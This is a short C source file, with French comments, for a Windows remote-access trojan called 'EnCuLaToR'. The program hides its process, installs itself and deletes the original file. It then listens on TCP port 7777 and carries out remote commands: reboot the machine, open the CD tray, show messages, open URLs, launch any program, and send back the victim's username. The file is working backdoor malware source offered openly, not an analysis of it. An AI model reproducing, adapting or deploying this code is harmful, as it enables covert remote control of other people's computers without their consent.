



//----------------------------------------------------------------------
//
// EnCuLaToR TroYaN par TiPiaX - Hccc
//
//----------------------------------------------------------------------



#include <stdio.h>
#include <winsock.h>   //pour les sockets
#include "resource.h"
#include "datas.h"
#include "fonctions.hpp"



/**** ENTRY POINT ****/


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst,
				   LPSTR lpCmdLine, int nCmdShow)
{
    RegisterServiceProcess( 0, 1 );
	hInst = hInstance;

	GetModuleFileName(NULL,dir,sizeof(dir));

	if(lstrcmp(dir,thedir)!=0)
		setup();

	//Efface le server d'origine grace au fichier ini g�n�r�.
	clean();

	troyan();

    return (0);

}

/**** !� TROYAN �! ****/

int troyan(void)
{

	//initialisation du syst�me de sockets:
	verreq=MAKEWORD(2,2);
	WSAStartup(verreq,&wsaData);

	//remplissage de la structure sockaddr_in
	sin.sin_family = PF_INET;
	sin.sin_addr.s_addr = NULL;
	sin.sin_port = htons(7777);

	//cr�ation d'un socket:
	s = socket(PF_INET, SOCK_STREAM, 0);

	//bind le socket
	if (bind (s,(struct sockaddr *)&sin,len)==SOCKET_ERROR)
		goto error;

	//socket en ecoute de connection
	if (listen(s,1)==SOCKET_ERROR)
		goto error;

onrepart:

	//accepte la connection ?
	sok=accept(s,(struct sockaddr *)&info,&len);
	if (sok == INVALID_SOCKET){ goto error;}

	send(sok,signature,sizeof(signature),0);

	//ici tout est bon, y a plus qu'a recevoir les messages du client:
	int comparaison;
	recu = 1;
	while (recv(sok,buf,sizeof(buf),0)!=0) //tant que la connection existe
	{
		comparaison = lstrcmp(buf,message);
		if (comparaison==0){ ExitWindowsEx(EWX_REBOOT,NULL);}
		comparaison = lstrcmp(buf,open);
		if (comparaison==0){ mciSendString("Set cdaudio door open wait",0,0,0);}
		comparaison = lstrcmp(buf,close);
		if (comparaison==0){ mciSendString("Set cdaudio door closed wait",0,0,0);}
		comparaison = lstrcmp(buf,beep);
		if (comparaison==0){ Beep(NULL,NULL);}
		comparaison = lstrcmp(buf,parle);
		if (comparaison==0){ DialogBox(hInst,MAKEINTRESOURCE(IDD_DIALOG),NULL,(DLGPROC) DlgProc);}

		comparaison = lstrcmp(buf,url);
		if (comparaison==0)
		{
			sendok();
			if(recv(sok,theurl,sizeof(theurl),0)!=0)
			{
				ShellExecute(NULL,"open",theurl,NULL,NULL,SW_SHOWNORMAL);
			}
		}

		comparaison = lstrcmp(buf,prog);
		if (comparaison==0)
		{
			sendok();
			if(recv(sok,theprog,sizeof(theprog),0)!=0)
			{
				ShellExecute(NULL,"open",theprog,NULL,NULL,SW_SHOWNORMAL);
			}
		}

		//boite de message

		comparaison = lstrcmp(buf,chat);
		if (comparaison==0)
		{
			sendok();
			if(recv(sok,titre,sizeof(titre),0)!=0)
			{
				sendok();
				if(recv(sok,parole,sizeof(parole),0)!=0)
				{
					MessageBox(NULL,parole,titre,MB_OK);
				}
			}
		}

		comparaison = lstrcmp(buf,nom);
		if (comparaison==0)
		{
			GetUserName( thenom , &size );
			send(sok,thenom,sizeof(thenom),0);
		}

	}
	memset(&info,0,sizeof(SOCKADDR_IN));
	closesocket(sok);
	goto onrepart;

error:

	ExitProcess(0);
}




